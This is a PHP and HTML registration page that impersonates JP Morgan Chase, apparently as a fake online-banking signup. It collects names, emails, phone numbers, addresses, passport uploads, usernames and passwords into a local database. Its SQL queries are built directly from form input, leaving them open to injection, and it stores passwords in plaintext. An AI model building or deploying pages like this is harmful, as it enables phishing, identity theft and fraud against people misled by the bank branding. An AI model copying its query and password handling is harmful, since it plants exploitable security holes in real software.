
<!DOCTYPE html>
<html lang="en">
<head>
<title>Chase | Register</title>
<!-- Meta tag Keywords -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Sales Inquiry Form Responsive Widget Template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, 
Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false);
function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- Meta tag Keywords -->
<!--bootstrap cdn-->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<!--end bootstrap cd-->
<!-- css files -->
<link href="css/style.css" rel="stylesheet" type="text/css" media="all">
<!-- //css files -->
<!-- online-fonts -->
<link href="//fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&subset=cyrillic,cyrillic-ext,greek,greek-ext,latin-ext,vietnamese" rel="stylesheet">

<style>
	input[type='file']{
		border-radius: 7px;
		padding: 7px 3px 7px 3px;
	}
</style>
<script type="text/javascript">

   $(document).ready(function()
   {
       $('#myModal').modal('show');
   });

</script>

 <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>

<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "offline";
$date = date('d-m-Y H:m:s');
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
	
   if (isset($_POST['email'])){
$name = $_POST['name'];
$email = $_POST['email'];
$occupation = $_POST['occupation'];
$phone = $_POST['phone'];
$accounttype = $_POST['accounttype'];
$address = $_POST['address'];
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM register WHERE username = '$username'";
$result = $conn->query($sql);
if ($result->num_rows > 0 ) {
$fail='<div class="alert alert-danger">Sorry. username is already taken</div>';


}else{

$sql = "INSERT INTO register (name, email, a, phone, account_type, b, username, password)
VALUES ('$name', '$email', '$occupation', '$phone', '$accounttype', '$address', '$username', '$password')";

if ($conn->query($sql) === TRUE) {
   echo '';
$success='<div class="alert alert-success">Successful, check your mail box(' .$email. ') for more details</div>';
}

}
}
?>

	<!--header-->
	<div class="agile-header">
		<h1>Register</h1>
		<p>You do not have to walk into a chase bank to have an account with us, just create one online.</p>
	</div>

	<!--//header-->
	<!--main-->
	<div class="agileits-main">
		<div class="wrap">
		<form action="" method="post">
<div class="form-group">
        <div class="col-sm-10 col-sm-offset-2">
            <?php 
if (isset($success)){
echo $success; 
}
if (isset($fail)){
echo $fail; 
}
?>    
        </div>
    </div><br>
			<ul>
				<li class="text">name  :  </li>
				<li><input name="name" type="text" required></li>
			</ul>
			
			<ul>
				<li class="text">E-mail  :  </li>
				<li><input name="email" type="text" required></li>
			</ul>
			<ul>
				<li class="text">Occupation  :  </li>
				<li><input name="occupation" type="text" required></li>
			</ul>
			<ul>
				<li class="text">mobile no  :  </li>
				<li><input name="phone" type="text" required></li>
			</ul>
<ul>
				<li class="text">Passport:  </li><font color=white>
				<li> <label><span class="glyphicon glyphicon-upload"></span><input type="file" name="passport" style="border: none; background-color: transparent;"></label>
</label></li></font>
			</ul>
			<ul>
				<li class="text">account type :  </li>
				<li><select class="form-control"  name=accounttype  style="margin-left: 7px; height: 35px; width: 300px; background: transparent; color: white" required>
    <option value="" disabled="disabled" selected="selected">Select account type</option>
    <option value="savings">saving</option>
    <option value="current">current</option>
</select></li>
			</ul>
			<ul>
				<li class="text">address   :  </li>
				<li><input name="address" type="text" required></li>
			</ul>
			<ul>
				<li class="text">username :  </li>
				<li><input name="username" type="text" required></li>
			</ul>
			<ul>
				<li class="text">password  :  </li>
				<li><input id="password" name="password" type="password" required></li>
			</ul>
			
			<ul>
				<li class="text">confirm password :  </li>
				<li><input name="cpassword" id="confirm_password" type="password" required></li>
			</ul>
			
<div class="clear"></div>
			<div class="agile-submit">
				<input type="submit" value="submit" class="btn btn-info btn-lg" data-toggle="modal" data-target="#myModal">
				<input type="reset" value="reset">
			</div>
			
			

<script>
	var password = document.getElementById("password")
  , confirm_password = document.getElementById("confirm_password");

function validatePassword(){
  if(password.value != confirm_password.value) {
    confirm_password.setCustomValidity("Passwords do not match");
  } else {
    confirm_password.setCustomValidity('');
  }
}

password.onchange = validatePassword;
confirm_password.onkeyup = validatePassword;
</script>
			</form>
		</div>	
	</div>

<!--//main-->
<!--footer-->
<div class="footer-w3">
	<p>&copy; 2018 JP Morgan Chase Registeration Portal. All rights reserved | Design by <a href="http://chase.com">Chase</a></p>
</div>
<!--//footer-->
</body>
</html>